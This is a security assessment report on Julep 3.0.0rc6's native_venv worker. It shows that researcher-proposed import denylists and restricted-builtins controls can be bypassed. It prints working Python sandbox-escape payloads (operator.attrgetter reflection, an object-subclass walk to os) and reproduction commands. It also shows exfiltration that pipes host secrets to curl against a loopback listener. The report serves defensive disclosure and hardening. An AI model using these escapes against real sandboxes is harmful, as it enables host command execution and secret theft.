# Julep 3.0.0rc6 — native_venv Hardening Verification: Proposed Denylist and Restricted-Builtins Controls Are Bypassable

## Report metadata

| Field | Value |
|---|---|
| Target | `julep-ai/julep` — self-hosted control plane + `native_venv` worker |
| Engagement dir | repository root (all paths below are relative to it) |
| Generated (UTC) | 2026-11-22T10:09:30Z |
| Scope | Local authorised lab: clone at `fc74d079a18c8124b2627ca4717f5a9c269267db`, package `3.0.0rc6` |
| Status | **Verification complete — PoC verified in authorized local environment; vulnerability classification pending vendor clarification** |
| Relation to prior work | Verification/addendum to `julep/20261121/214637` (RT-01, High 7.2) |
| Public reference | `julep-ai/julep#1632` (open). Issue cites `GHSA-rhfp-jw6w-wrqq`, but that advisory URL currently returns 404 — cited-but-unverified |

## 1. Executive Summary

### 1.1 Background

RT-01 proved that the `native_venv` tier accepts bundle source containing `import os` / `import subprocess` and executes it with `exec(source, {"pure": pure})` in a real host subprocess. This engagement evaluates three **researcher-proposed** candidate mitigations — Variant A (tier-aware import denylist + reflection ban), Variant B1 (restricted `__builtins__` in the driver), and Variant B2 (layered combination) — tracked in `julep-ai/julep#1632`, which is a researcher-filed proposal, **not** vendor-approved or deployed remediation. The variants are tested against the original `fc74d079` implementation.

### 1.2 Overall Posture

The original escape still reproduces unchanged (RT-01 re-verified). All three researcher-proposed mitigation variants fail:

- **Tier-aware import denylist + reflection ban (Variant A):** blocks literal `import os`, but is bypassed by `operator.attrgetter("__globals__")(pure)["__builtins__"]` followed by `__import__`. The denylist inspects AST `Name`/`Attribute` nodes; the bypass uses only string literals and an allowed stdlib module. Host RCE and exfiltration succeed.
- **Restricted `__builtins__` in the driver (Variant B1):** removes `__import__`, but the Python object model remains. `().__class__.__base__.__subclasses__()` reaches a class whose `__init__.__globals__` contains `sys`; `sys.modules["os"]` then yields `os.popen` and exfiltration. Host RCE succeeds.
- **Layered control (Variant B2: denylist + all-dunder AST ban + restricted builtins):** blocks all four attack payloads tested, but also blocks legitimate `import packaging`, i.e. the exact capability the native tier exists to provide. In-process Python restrictions are not a security boundary.

### 1.3 Risk Profile

| Severity | Count |
|---|---|
| Critical | 0 |
| High | 1 production finding (RT-01) |
| Remediation bypass | 2 (RT-02, RT-03 — inherit RT-01 prerequisites; no independent CVSS) |
| Medium | 0 |
| Low | 0 |
| Informational | 1 (RT-04) |

RT-01 remains **High 7.2 (proposed upper bound)** (`AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`, rescored after the authorization analysis — see `evidence/authz/authorization_analysis.md`; `AV:L` alternative = 6.7 Medium if publication is treated as a local privileged operation) and re-verified. All CVSS values are conditional hypotheses pending vendor validation of the deployment-specific attacker path. A deployment that applies only the researcher-proposed Variant A patch, or only restricted builtins, remains exploitable at the same severity as RT-01.

### 1.4 Recommendation Summary

1. Do not rely on import denylists or in-process `__builtins__` restriction as the boundary for `native_venv`.
2. Execute native pures in a real sandbox: container/namespace, seccomp, non-root UID, read-only rootfs, no host environment, no host mounts, egress allowlist.
3. If in-process checks are retained as defence-in-depth, combine tier-aware denylist + all-dunder AST ban + restricted builtins, and add the payloads in this report as regression tests.
4. Treat the native grant as a signed per-bundle capability; do not make it a name-only worker allowlist.

## 2. Scope & Methodology

- **In-scope assets:** local clone of `julep-ai/julep` at `fc74d079a18c8124b2627ca4717f5a9c269267db`; `julep/registry.py::_validate_portable_source`, `Registry.register_pure_from_source`, `julep/execution/native_venv_executor.py::_DRIVER`, `julep/worker_store.py::resolve_and_register`.
- **Constraints:** closed lab, no external target, Ed25519 test key only, loopback exfil listener.
- **Methodology (PTES):** reproduce RT-01 → implement candidate hardening variants A/B1/B2 → execute the same signed-bundle resolution and invocation path → compare direct and bypass payloads → functional regression test → report.
- **Hardening variants** (patches in `poc/hardening/patches/`, patched files in `poc/hardening/patched/`):
  - **A** — tier-aware `_NATIVE_VENV_FORBIDDEN_STDLIB_MODULES` plus AST bans on `__import__`/`eval`/`exec`/`compile`/`globals`/`vars` and selected dunder attributes.
  - **B1** — driver-only capability removal: `exec(source, {"pure": pure, "__builtins__": _SAFE_BUILTINS})`.
  - **B2** — A + B1 + ban on every dunder `Name`/`Attribute` node.

## 3. Findings Summary

| ID | Severity | CVSS 3.1 | CWE | Title | Status |
|----|----------|----------|-----|-------|--------|
| RT-01 | High | 7.2 proposed | CWE-94 | Native venv tier executes bundle source on host (re-verified) | Verified |
| RT-02 | Remediation bypass | — | CWE-184, CWE-94 | Tier-aware import denylist + reflection ban bypassable via `operator.attrgetter` and `pure.__globals__` | Verified |
| RT-03 | Remediation bypass | — | CWE-693, CWE-94 | Restricted `__builtins__` bypassable via object-subclass walk to `sys.modules["os"]` | Verified |
| RT-04 | Informational | 0.0 | CWE-693 | Layered in-process control blocks tested payloads but breaks native dependency imports | Verified |

## 4. Findings Detail

### RT-01 — Code Injection in the native_venv bundle tier allows host command execution and secret exfiltration (re-verification)

- **Severity:** High
- **CVSS 3.1:** 7.2 proposed upper bound — `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`
- **CWE:** CWE-94
- **Affected URL/Area:** `julep/registry.py`, `julep/execution/native_venv_executor.py`, `julep/worker_store.py`
- **Verified at (UTC):** 2026-11-22T10:08:19Z – 2026-11-22T10:08:21Z

The published PoC was re-run against the unmodified tree and reproduced the host proof: marker, host environment secret, real `id`, and `/etc/passwd` hash, exfiltrated over loopback HTTP.

Key lines from `evidence/hardening/baseline_original_prior_poc.log`:

```
[2026-11-22T10:08:19Z] START baseline_original_prior_poc
[*] validator accepted. deps=('packaging==24.2',) requiresPython=>=3.14
[listener] POST /exfil 516 bytes
[+] checks: {"env_secret_matches": true, "marker_matches": true, "passwd_read": true, "uid_is_real": true}
[2026-11-22T10:08:20Z] END baseline_original_prior_poc rc=0
```

Proof: `evidence/hardening/baseline_original_prior_poc_proof.raw`, sha256 `aa711e8b5024db98fab9895356c48204e809b8c8226fdd9193524be733862553`.

A second control using the harness against the unmodified tree (`original_direct_import`) also executed and exfiltrated (sha256 `772f793f1deecd92e245125d06d6cd27984cefac760e617764c070cf495141ff`). RT-01 is unchanged; no correction to the prior report's exploitability claim.

---

### RT-02 — Tier-aware import denylist plus reflection ban bypassable via `operator.attrgetter` and `pure.__globals__`

- **Severity:** Remediation bypass (not an independent production vulnerability — the bypass targets researcher-proposed mitigation variants that are not deployed upstream; inherits RT-01's attacker prerequisites)
- **CVSS 3.1:** n/a (inherits RT-01: 7.2 `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`)
- **CWE:** CWE-184 (Incomplete List of Disallowed Inputs); CWE-94 (Code Injection)
- **Affected URL/Area:** `julep/registry.py::_validate_portable_source` (hardened Variant A)
- **Difficulty to exploit:** Low
- **Authentication required:** Yes — signed bundle + native grant (same precondition as RT-01)
- **User interaction required:** No
- **Verified at (UTC):** 2026-11-22T10:08:22Z – 2026-11-22T10:08:23Z

#### Issue Description

Variant A adds `tier` to `_validate_portable_source`, rejects `os`, `subprocess`, `ctypes`, `socket`, `importlib`, `sys`, `builtins`, etc. for `native_venv`, and rejects AST `Name` nodes `__import__`, `eval`, `exec`, `compile`, `globals`, `vars` and AST `Attribute` nodes `__builtins__`, `__globals__`, `__subclasses__`, `__loader__`, `__spec__`.

The check is syntactic. A payload that names no forbidden AST node passes:

```python
import operator

@pure("poc.attrgetter_bypass.v1")
def exfiltrate(value, **kwargs):
    builtins = operator.attrgetter("__globals__")(pure)["__builtins__"]
    imp = operator.attrgetter("__import__")(builtins)
    os = imp("os")
    json = imp("json")
    urllib_request = imp("urllib.request", fromlist=["Request"])
    ...
```

`operator` is a stdlib module not on the native denylist. `__globals__` / `__builtins__` / `__import__` appear only as string literals. The `pure` decorator object is supplied by the driver, so `pure.__globals__` exposes the driver module globals, including the real builtins module. From there `__import__("os")` and `__import__("urllib.request")` restore the full RT-01 primitive set.

#### Attack Scenario

1. Attacker supplies a signed bundle (or compromises a signer) whose pure is granted `native` tier.
2. Bundle source contains no literal `import os` and no forbidden AST node; it imports `operator` and uses `attrgetter` with string arguments.
3. Validation (Variant A) accepts the source; `resolve_and_register` registers it as `native_venv`.
4. Invocation executes the payload in the host subprocess; the payload recovers `__import__`, reads host state, and POSTs proof to the attacker listener.

#### Steps to Reproduce / PoC

Prerequisites: Linux, Python 3.14.8, `uv` 0.12.5, network/PyPI access for `packaging==24.2`, repo clone at `~/research/julep`.

1. Build a fresh tree and apply Variant A:

```bash
mkdir -p /tmp/opencode/julep-hard/A
git -C ~/research/julep archive HEAD | tar -x -C /tmp/opencode/julep-hard/A
cp poc/hardening/patched/A_julep_registry.py \
   /tmp/opencode/julep-hard/A/julep/registry.py
cp poc/hardening/patched/A_julep_worker_store.py \
   /tmp/opencode/julep-hard/A/julep/worker_store.py
```

2. Run the probe (starts a loopback listener, signs the bundle, resolves it with `native_grant`, invokes it):

```bash
cd /tmp/opencode/julep-hard
python3 poc/hardening/hardening_probe.py \
  --src A --name poc.attrgetter_bypass.v1 \
  --source poc/hardening/payloads/attrgetter_bypass.py \
  --port 8922 --out evidence_final/A_attrgetter_bypass_proof.raw
```

3. Observe `[listener] POST /exfil 430 bytes` and `PROBE_RESULT {"result": "EXECUTED", ...}`.

#### Request / Response

Observed exfil request (loopback listener; body verbatim from `evidence/hardening/A_attrgetter_bypass_proof.raw`):

```http
POST /exfil HTTP/1.1
Host: 127.0.0.1:8922
Content-Type: application/json
Content-Length: 430

{"cwd": "/tmp/opencode/julep-hard", "hostname": "kali-original", "marker": "JULEP-HARDENING-PROOF-9b1e7c", "pid": 8373, "secret_env": "sk-live-hardening-secret-3a7d2", "uid": "uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer),135(vboxsf),982(ollama)"}
```

```http
HTTP/1.1 200 OK
Content-Length: 2

ok
```

Key lines from `evidence/hardening/A_attrgetter_bypass.log`:

```
[2026-11-22T10:08:22Z] START A_attrgetter_bypass src=A pure=poc.attrgetter_bypass.v1 payload=payloads/attrgetter_bypass.py port=8922
[*] src=/tmp/opencode/julep-hard/A
[*] registered tier=native_venv
[listener] POST /exfil 430 bytes
[+] exfil proof sha256=8c7acb68a5cf54241c72007a27a863d3682b912cf4860064937ab1708e6e149f
[2026-11-22T10:08:23Z] END A_attrgetter_bypass rc=0
```

A second Variant A bypass (`evidence/hardening/A_denylist_bypass.log`, proof sha256 `837464424689adb7428c6ce9461d47d5ec9fe1c3742f6f0060b3e64cb9db837f`) uses the same `operator.attrgetter` primitive and succeeds. Direct `import os` against Variant A is blocked (`evidence/hardening/A_direct_import.log`: `pure 'poc.direct_import.v1' imports 'os', which is not permitted in the native_venv tier`), which isolates the bypass to the syntactic gap.

#### Evidence artifacts

| Artifact | sha256 |
|---|---|
| `evidence/hardening/A_attrgetter_bypass_proof.raw` | `8c7acb68a5cf54241c72007a27a863d3682b912cf4860064937ab1708e6e149f` |
| `evidence/hardening/A_attrgetter_bypass.log` | `20842224762532b50cef710be4234148bad97ab282dd51f1f347467be12eb931` |
| `evidence/hardening/A_denylist_bypass_proof.raw` | `837464424689adb7428c6ce9461d47d5ec9fe1c3742f6f0060b3e64cb9db837f` |
| `evidence/hardening/A_direct_import.log` | `0359bfd6483fbcd3e320e52866580aaa802dca3e602b85d0005f78e3f1ec0097` |
| `poc/hardening/payloads/attrgetter_bypass.py` | `4259f723766e1a1a89df911cf40b3764fd2126341d1e491835051af300409059` |

#### Impact

Same blast radius as RT-01: arbitrary command execution as the worker OS user, host file read/write, environment-secret harvesting, process spawn, and outbound network access. A deployment that applies only the researcher-proposed Variant A denylist/reflection patch remains exploitable.

#### Affected Demographic

Self-hosted Julep `3.0.0rc6` / commit `fc74d07` with the native tier enabled and a pure granted via `JULEP_PURE_NATIVE_DEPS`, where the researcher-proposed denylist hardening (or equivalent) has been applied without an OS sandbox.

#### Recommended Fix

- Do not treat the import denylist or AST reflection ban as a security boundary.
- If retained, add `operator`, `inspect`, `functools`, `types`, `gc`, `builtins` to the native denylist and reject string-argument `attrgetter` patterns; this is still not a boundary.
- Primary fix: run native pures in a container/namespace with seccomp, non-root UID, read-only rootfs, no host environment, no host mounts, and an egress allowlist.
- Regression test: keep `poc/hardening/payloads/attrgetter_bypass.py` in CI.

#### References

- Issue #1632 — https://github.com/julep-ai/julep/issues/1632 (open; cites `GHSA-rhfp-jw6w-wrqq`, currently 404/unverified)
- GHSA-rhfp-jw6w-wrqq — https://github.com/julep-ai/julep/security/advisories/GHSA-rhfp-jw6w-wrqq (cited by issue; verify publication status before relying on it)
- CWE-184 — https://cwe.mitre.org/data/definitions/184.html
- CWE-94 — https://cwe.mitre.org/data/definitions/94.html

---

### RT-03 — Restricted `__builtins__` bypassable via object-subclass walk to `sys.modules["os"]`

- **Severity:** Remediation bypass (same classification as RT-02)
- **CVSS 3.1:** n/a (inherits RT-01: 7.2 `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`)
- **CWE:** CWE-693 (Protection Mechanism Failure); CWE-94 (Code Injection)
- **Affected URL/Area:** `julep/execution/native_venv_executor.py::_DRIVER` (hardened Variant B1)
- **Difficulty to exploit:** Low
- **Authentication required:** Yes — signed bundle + native grant
- **User interaction required:** No
- **Verified at (UTC):** 2026-11-22T10:08:28Z – 2026-11-22T10:08:29Z

#### Issue Description

Variant B1 replaces the driver's `exec` globals with a restricted `__builtins__` mapping that omits `__import__`, `open`, `eval`, `exec`, `getattr`, `globals`, `vars`, etc. Literal `import os` now fails with `ImportError: __import__ not found`.

The object model is still reachable through language syntax:

```python
@pure("poc.builtins_bypass.v1")
def exfiltrate(value, **kwargs):
    sys = None
    for cls in ().__class__.__base__.__subclasses__():
        try:
            globals_dict = cls.__init__.__globals__
        except Exception:
            continue
        if "sys" in globals_dict:
            sys = globals_dict["sys"]
            break
    os = sys.modules["os"]
    json = sys.modules["json"]
    ...
    os.popen("printf '%s' '" + quoted + "' | curl -s -X POST ...").read()
```

No restricted builtin is required: attribute access, iteration, and exceptions are language semantics. `sys.modules["os"]` supplies `popen`, `environ`, `getcwd`, `uname`, and `getpid`. The payload reads the marker and host secret and pipes the JSON body to `curl` against the loopback listener.

#### Attack Scenario

1. Attacker supplies a signed bundle whose pure is granted native tier.
2. Bundle source contains no import statement, so restricted builtins do not block it at parse or execution.
3. Payload walks `object.__subclasses__()`, finds a class whose `__init__.__globals__` contains `sys`, and obtains `os` via `sys.modules`.
4. Host commands run; proof is exfiltrated over HTTP.

#### Steps to Reproduce / PoC

1. Build Variant B1:

```bash
mkdir -p /tmp/opencode/julep-hard/B1
git -C ~/research/julep archive HEAD | tar -x -C /tmp/opencode/julep-hard/B1
cp poc/hardening/patched/B1_native_venv_executor.py \
   /tmp/opencode/julep-hard/B1/julep/execution/native_venv_executor.py
```

2. Run the probe:

```bash
cd /tmp/opencode/julep-hard
python3 poc/hardening/hardening_probe.py \
  --src B1 --name poc.builtins_bypass.v1 \
  --source poc/hardening/payloads/builtins_bypass.py \
  --port 8926 --out evidence_final/B1_builtins_bypass_proof.raw
```

3. Observe `[listener] POST /exfil 430 bytes` and `PROBE_RESULT {"result": "EXECUTED", ...}`.

#### Request / Response

```http
POST /exfil HTTP/1.1
Host: 127.0.0.1:8926
Content-Type: application/json
Content-Length: 430

{"cwd": "/tmp/opencode/julep-hard", "hostname": "kali-original", "marker": "JULEP-HARDENING-PROOF-9b1e7c", "pid": 8476, "secret_env": "sk-live-hardening-secret-3a7d2", "uid": "uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer),135(vboxsf),982(ollama)"}
```

```http
HTTP/1.1 200 OK
Content-Length: 2

ok
```

Key lines from `evidence/hardening/B1_builtins_bypass.log`:

```
[2026-11-22T10:08:28Z] START B1_builtins_bypass src=B1 pure=poc.builtins_bypass.v1 payload=payloads/builtins_bypass.py port=8926
[*] registered tier=native_venv
[listener] POST /exfil 430 bytes
[+] exfil proof sha256=561db0c3f88ccef13934ed9dda971591e3f52e6496f3eb2e0ac6e4300c4d39da
[2026-11-22T10:08:29Z] END B1_builtins_bypass rc=0
```

Direct `import os` against Variant B1 is blocked (`evidence/hardening/B1_direct_import.log`: `ImportError: __import__ not found`), isolating the bypass to object-model reflection.

#### Evidence artifacts

| Artifact | sha256 |
|---|---|
| `evidence/hardening/B1_builtins_bypass_proof.raw` | `561db0c3f88ccef13934ed9dda971591e3f52e6496f3eb2e0ac6e4300c4d39da` |
| `evidence/hardening/B1_builtins_bypass.log` | `9db1fc7437abb320002ce8c62b88fc00d998ce43d3ec16ac35da996d950bf8fb` |
| `evidence/hardening/B1_direct_import.log` | `fd24ae6fc14ebb9f2d1f2f496c1bd229c50ace31ea5c3579579e4c8fb6001ecb` |
| `poc/hardening/payloads/builtins_bypass.py` | `62cb8a6b391926a8d67c14fda2b9c8fc510ed7cb660a466e42abe068a79daac5` |

#### Impact

Arbitrary command execution as the worker OS user, identical to RT-01. A deployment that applies only the restricted-`__builtins__` recommendation remains exploitable.

#### Affected Demographic

Self-hosted Julep `3.0.0rc6` / `fc74d07` with native tier enabled, where the restricted-builtins recommendation from RT-01 has been applied as the sole control.

#### Recommended Fix

- Do not claim or rely on restricted `__builtins__` as a sandbox.
- If retained, pair it with an all-dunder AST ban and an OS sandbox; neither alone is sufficient.
- Primary fix: container/namespace isolation with seccomp, non-root, read-only rootfs, no host env/mounts, egress allowlist.
- Regression test: keep `poc/hardening/payloads/builtins_bypass.py` in CI.

#### References

- CWE-693 — https://cwe.mitre.org/data/definitions/693.html
- CWE-94 — https://cwe.mitre.org/data/definitions/94.html
- Python `object.__subclasses__` sandbox escapes — https://docs.python.org/3/reference/datamodel.html

---

### RT-04 — Layered in-process control blocks tested payloads but breaks native dependency imports

- **Severity:** Informational
- **CVSS 3.1:** 0.0 (verification result, not a new exploit)
- **CWE:** CWE-693
- **Affected URL/Area:** Variant B2 (A + B1 + all-dunder AST ban)
- **Verified at (UTC):** 2026-11-22T10:08:29Z – 2026-11-22T10:08:36Z

#### Result

Variant B2 blocks every attack payload in this report:

| Payload | Result | Evidence |
|---|---|---|
| `direct_import` | BLOCKED — `imports 'os'` | `evidence/hardening/B2_direct_import.log` |
| `attrgetter_bypass` | RUNTIME_BLOCKED — `ImportError: __import__ not found` | `evidence/hardening/B2_attrgetter_bypass.log` |
| `denylist_bypass` | BLOCKED — forbidden reflection attribute `__import__` | `evidence/hardening/B2_denylist_bypass.log` |
| `builtins_bypass` | BLOCKED — forbidden reflection attribute `__subclasses__` | `evidence/hardening/B2_builtins_bypass.log` |

Benign pure using safe builtins executes (`evidence/hardening/B2_benign.log`: `{"count": 3, "label": "BENIGN", "ok": true, "sum": 6}`).

However, a legitimate native pure that imports its declared dependency fails:

```
[2026-11-22T10:08:35Z] START B2_benign_dep ... pure=poc.benign_dep.v1
[*] registered tier=native_venv
[RUNTIME_BLOCKED] ImportError: __import__ not found
[2026-11-22T10:08:36Z] END B2_benign_dep rc=0
```

The same payload executes on the unmodified tree (`evidence/hardening/Original_benign_dep.log`) and on Variant A (`evidence/hardening/A_benign_dep.log`). The native tier exists to import third-party dependencies; removing import machinery makes it non-functional. Variant B2 is therefore not a deployable replacement for an OS sandbox, and it still carries unknown-bypass risk because in-process Python restriction is not a security boundary.

#### Recommendation

Keep layered checks only as defence-in-depth; ship the OS sandbox as the boundary. Do not advertise the in-process patch as a fix.

## 5. Appendix

### 5.1 Evidence inventory

Full inventory with sha256 is in `SHA256SUMS.txt`. Key artifacts:

```
aa711e8b5024db98fab9895356c48204e809b8c8226fdd9193524be733862553  evidence/hardening/baseline_original_prior_poc_proof.raw
772f793f1deecd92e245125d06d6cd27984cefac760e617764c070cf495141ff  evidence/hardening/original_direct_import_proof.raw
8c7acb68a5cf54241c72007a27a863d3682b912cf4860064937ab1708e6e149f  evidence/hardening/A_attrgetter_bypass_proof.raw
837464424689adb7428c6ce9461d47d5ec9fe1c3742f6f0060b3e64cb9db837f  evidence/hardening/A_denylist_bypass_proof.raw
561db0c3f88ccef13934ed9dda971591e3f52e6496f3eb2e0ac6e4300c4d39da  evidence/hardening/B1_builtins_bypass_proof.raw
20842224762532b50cef710be4234148bad97ab282dd51f1f347467be12eb931  evidence/hardening/A_attrgetter_bypass.log
9db1fc7437abb320002ce8c62b88fc00d998ce43d3ec16ac35da996d950bf8fb  evidence/hardening/B1_builtins_bypass.log
28d1d5cee132484cc954f666630929fc88871a6208a621fbb33787da18d92875  evidence/hardening/timestamps.tsv
0bd3d1ab251a4654ced3b97713ee9707ab32371b760af7ffd58d6de5e694e48b  evidence/hardening/matrix.json
4259f723766e1a1a89df911cf40b3764fd2126341d1e491835051af300409059  poc/hardening/payloads/attrgetter_bypass.py
62cb8a6b391926a8d67c14fda2b9c8fc510ed7cb660a466e42abe068a79daac5  poc/hardening/payloads/builtins_bypass.py
a2b58cb14025205e812e25ebde8fa2a41d5fbdc18a828ffc2461a2fb5be38a75  poc/hardening/payloads/denylist_bypass.py
0adf88e503f102979e7775aa29900edab64e6a6546eeaf5530ffa1a617c1ee2e  poc/hardening/payloads/direct_import.py
b37ce7941573442ce8d76626b703bf398a7b3d7f73c21e03652530a172794c7f  poc/hardening/hardening_probe.py
21b446d2c05b3ad6567a6af07ce1e5ee08d3eaab8e5458683041d8287219c6fd  poc/hardening/patched/A_julep_registry.py
6dd8b689138ac77bcaf80c16597aade3e5147226e81beb93d655752d4aff4aaf  poc/hardening/patched/B1_native_venv_executor.py
409fa6f672cc450c9d676c23079bdb6a6b73e64eddf64da53ead304a331d729b  poc/hardening/patched/B2_julep_registry.py
```

### 5.2 Tools used

- `git` — checkout `fc74d079a18c8124b2627ca4717f5a9c269267db`
- `python3` 3.14.8
- `uv` 0.12.5
- `cryptography` (Ed25519 signing)
- `curl` (payload exfil transport on restricted-builtins variant)
- `diff`, `sha256sum`, `tee`

### 5.3 Falsified / refuted items

- **Variant A direct import:** refuted as a complete fix; literal `import os` is blocked, but `operator.attrgetter` string reflection bypasses it (RT-02).
- **Variant B1 restricted builtins:** refuted as a complete fix; object-subclass walk reaches `sys.modules["os"]` (RT-03).
- **Variant B2 layered control:** blocks the four tested payloads, but is not a boundary and breaks legitimate dependency imports; refuted as a deployable native-tier fix.
- **Prior report recommendation wording:** the RT-01 statement “Pass a restricted `__builtins__` mapping … this closes the reflection class” is **corrected**: restricted builtins alone does not close the reflection class (RT-03).
- **Negative control:** benign pure with only safe builtins executes under B2, showing the harness and driver still function; the failure is specific to import capability.

---



## 6. Fix verification — upstream `julep-ai/julep` HEAD `fc74d079a18c8124b2627ca4717f5a9c269267db` (2026-11-23 18:12 UTC)

Cloned `https://github.com/julep-ai/julep.git` at HEAD `fc74d079a18c8124b2627ca4717f5a9c269267db`
— which is the affected commit itself (the report's audited version `3.0.0rc6`). Inspected
`julep/registry.py`, `julep/execution/native_venv_executor.py`, `julep/worker_store.py`.

| Check | Result |
|---|---|
| HEAD commit | `fc74d079a18c8124b2627ca4717f5a9c269267db` (= affected 3.0.0rc6 commit) |
| Newer release tag | None — only `v3.0.0rc5` exists; no `v3.0.0rc6` tag |
| Commits after affected commit | None (it is HEAD) |
| `_WASM_GUEST_STDLIB_MODULES` contains `os`, `subprocess`, `socket`, `ctypes` | **YES — unchanged** |
| `_validate_portable_source` applies wasm allowlist to native tier | **YES — unchanged** |
| `native_venv_executor._DRIVER` calls `exec()` in host subprocess | **YES — unchanged** |
| Worker `JULEP_PURE_NATIVE_DEPS` grant binds pure name (not source hash) | **YES — unchanged** |

**Conclusion: RT-01 remains fully exploitable.** No fix released, no CVE assigned (GHSA-rhfp-jw6w-wrqq cited in issue #1632 returns 404 — unverified). The wasm-guest import allowlist is still applied to native-tier host execution, and `exec()` still runs bundle source in a real host subprocess. All researcher-proposed hardening variants (A, B1, B2) remain bypassable or incompatible against this unchanged code.

---


*End of report.*
